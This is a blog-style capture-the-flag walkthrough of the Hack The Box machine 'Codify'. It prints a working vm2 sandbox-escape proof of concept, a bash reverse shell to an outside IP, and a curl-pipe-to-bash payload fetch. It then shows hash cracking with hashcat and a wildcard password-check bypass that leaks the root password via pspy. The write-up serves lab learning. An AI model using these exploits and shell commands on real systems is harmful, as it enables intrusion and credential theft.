---
title: Codify from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Codify from HTB
[page](https://app.hackthebox.com/machines/Codify)
`Nmap` gave nothing unusual.
Went to the site and saw `vm2`and then went for `vm2 exploit`and got to this github:
https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
code is:
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`

console.log(vm.run(code));
```
This will show:
```bash
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```
This means we can execute commands.
I went to my terminal and wrote `reverse.sh`:
```bash
#!/bin/bash
sh -i >& /dev/tcp/10.10.16.4/1234 0>&1
```
Then i started `simple server` with `python3 -m http.server 8000` and then used `curl`to get the file and execute it:
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.16.4:8000/reverse.sh|bash');
}
`

console.log(vm.run(code));
```
This got me connection on `NetCat`:
```bash
rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.239] 36178
can't access tty; job control turned off
$ script  /dev/null -c bash


svc@codify:/var/www/contact$ file tfile tickets.db
file tickets.db
tickets.db: SQLite 3.x database,



sqlite3 tickets.db
SQLite version 3.46.0 2024-05-23 13:25:27
Enter ".help" for usage hints.
sqlite> .tables
tickets  users
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```
Password for `Joshua` ----- $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

`hashid`told me this:
```bash
$ hashid '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
Analyzing '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
```
It is `bcrypt`.
```bash
$ hashcat --force -m 3200 hash /usr/share/wordlists/rockyou.txt


$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```
Password is `spongebob1`
```
su joshua
password: spongebob1

cat /home/joshua/user.txt
00b4a83c6272242b48ef48b86dce70d7
```
***
User Flag is: 00b4a83c6272242b48ef48b86dce70d7
***
```bash
sudo -l
User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```
After analyzing the code:
```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```
This can be exploited:
```
if [[ $DB_PASS == $USER_PASS ]]; then
```
Because if `$USER_PASS`will be `*`it will be the root password.
`* is every string you can do research about "wild cards" or visit pwn.college and finish first 2 dojos`
This Will leak `root passowrd`in `linux processes` and to read it we need to use `pspy64s`which can be downloaded from this `github repository`:
```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
```
***
`Pspy`is a powerful command-line tool specifically designed to monitor Linux processes without the need for administrative privileges. With `Pspy`, you can obtain valuable insights into the activities and behaviors of processes running on a Linux system.

One of the key advantages of `pspy` is its ability to operate without root or administrative access, making it useful for security audits, forensics investigations, and general system monitoring. It allows you to observe process-to-process interactions, monitor the creation and termination of processes, and even capture command-line arguments passed to specific processes.
***
Open another connection to `ssh`with `joshua`user and transfer `pspy64s`via `python3 simple server`. Make it executable and run it:
```python
wget http://<your_ip>:<port>/pspy64s
chmod +x pspy64s
./pspy64s
```
In other `ssh connection`start the `/opt/scripts/mysql-backup.sh`and make password equal to`*`
```bash
$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```
Then check `pspy64s`and search for password:
```
2024/08/08 10:43:07 CMD: UID=0    PID=2393   | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys
```
`kljh12k3jhaskjh12kjh3` is password. After that become the root and read the flag:
```bash
$ su root
Password:
root@codify:/home/joshua# cat /root/root.txt
b8ad88846ff449e6ad4788eb309c6ead
```
***
Root Flag is: b8ad88846ff449e6ad4788eb309c6ead
***

![](/assets/images/Screenshot from 2024-08-08 14-44-12.png)
